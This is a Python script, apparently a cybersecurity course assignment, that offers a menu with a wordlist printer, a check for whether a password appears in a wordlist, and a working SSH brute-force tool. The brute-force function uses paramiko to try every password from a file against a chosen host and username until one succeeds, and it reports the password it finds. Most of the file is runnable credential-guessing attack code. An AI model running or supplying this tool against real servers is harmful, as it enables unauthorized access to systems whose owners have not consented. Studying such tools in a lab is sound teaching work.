#!/bin/usr/python3

# Script Name:                  ops401-challenge17
# Author:                       Omar Ardid
# Date of latest revision:      05/21/2024
# Purpose:                      Adding Authenticate to an SSH server by its IP address
# Resources:                    https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/

import time
import paramiko, os, sys, socket

def offensive():
    # Asking the user for word list
    wordlistpath = input("Enter word list file path: ") 
    # Checking the provided path is a file
    if os.path.isfile(wordlistpath): 
        try: 
            # Open word list in read mode
            with open(wordlistpath, 'r') as wordlistfile:
                # Iterate each word in the word list
                for word in wordlistfile:
                    # Remove trailing whitespaces from the password
                    word = word.rstrip()
                    # Printing the word to the screen
                    print(word)
                    # Delay between words
                    time.sleep(0.1)
        except Exception as e: 
            # Print any errors that may occur
            print(f"An error occurred: {e}")
    else:
        print("(ง •̀_•́)ง Word file not found. Please enter a vaild file path! ")

def defensive():
    # Asking the user for target string
    target_password = input("Enter a password to search: ")
    # Asking the user for word list
    wordlistpath = input("Enter word list file path: ")
    # Checking the provided path is a file
    if os.path.isfile(wordlistpath):
        try:
            # Open word list in read mode
            with open(wordlistpath, 'r') as wordlistfile:
                # Check if target string is in word list
                if target_password in wordlistfile.read():
                    # Print if string is found
                    print(f"Password '{target_password}' found in the word list.")
                else:
                    # Print if string is not found
                    print(f"String '{target_password}' not found in the word list.")
        except Exception as e:
            # Print any erros that may occur
            print(f"An error occurred: {e}")
    else:
        print("(ง •̀_•́)ง Word file not found. Please enter a vaild file path! ")

def ssh_brute_force():    
    try: 
        # Prompt the user for target host address, SSH username, and password file path
        host = input("Enter Target Host Address: ")
        username = input("Enter SSH Username: ")
        input_file = input("Enter SSH Password File: ")

        # Checks if file path exists
        if not os.path.exists(input_file):   
            # Print error message if file does not exist
            print("(ง •̀_•́)ง File Path does not Exists!!")
            sys.exit(4)
    except KeyboardInterrupt:
        # Handle keyboard interrupt gracefully
        print("User Requesed An Interrupt")
        # Exit with error code 3
        sys.exit(3)

    # Inialize exit code
    code = 0 

    # Open the passworld file in read mode
    with open(input_file, 'r') as file:
        # Iterate through each line the password file
        for line in file:
            # Remove trailing whitespaces from the password
            password = line.rstrip()
            try:
                # Create an SSH Client instance
                ssh = paramiko.SSHClient()
                # Set policy for automatically adding host keys
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                # Attempt SSH connection using the current password
                ssh.connect(host, port=22, username=username, password=password, banner_timeout=30, auth_timeout=30)
                # Close the SSH connection
                ssh.close()
                # Print success message if password is correct
                print(f"٩(◕‿◕)۶ Success! Password found: {password}")
                # Set exit code to 0
                code = 0 
                # Exit the loop
                break
            except paramiko.AuthenticationException:
                # Print error message if authentication fails
                print(f"(.づ◡ ﹏◡)づ. Failed! incorrect password: {password}")
                # Set exit code to 1
                code = 1
            except socket.error as e:
                # Print error message if a socket error occurs
                print(f"(`･︿´･ ) An error occurred: {e}")
                # Set exit code to 2
                code = 2
    # Return the exit code
    return code

def menu():
    while True:
        print("\n~~~~~ Brute Force Wordlist Attack ~~~~~")
        print("1. Offensive; Dictionary Iterator")
        print("2. Defensive; Password Recognzied")
        print("3. SSH Brute Force")
        print("0. Exit")
        choice = input("Enter a number: ")

        if choice == "1":
            offensive()
        elif choice == "2":
            defensive()
        elif choice == "3":
            result = ssh_brute_force()
            if result == 0:
                print("٩(◕‿◕)۶ SSH Brute Force was successfull!")
            elif result ==1:
                print("(ง •̀_•́)ง Authentication failed. Incorrect password.")
            elif result == 2:
                print("(`･︿´･ ) An error occurred during SSH connection!")
        elif choice == "0":
            print("(づ ◕‿◕ )づ Goodbye!")
            break
        else:
            print("\nง •̀_•́)ง Invalid number! ")

if __name__ == "__main__":
    menu()